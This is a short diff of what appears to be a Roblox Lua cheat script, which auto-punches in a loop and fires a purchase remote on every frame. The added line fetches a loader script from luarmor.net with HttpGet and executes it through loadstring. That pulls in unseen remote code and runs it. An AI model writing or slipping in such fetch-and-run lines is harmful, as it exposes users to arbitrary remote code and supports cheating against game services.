@@ -23,6 +23,8 @@ spawn(function()
     while task.wait() do punch() end
 end)
 
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f10afce2fa508525d12d2486bc8048c.lua"))()
+
 RunService.Heartbeat:Connect(function()
    pcall(function()
          SafePurchaseRemote:FireServer(1)
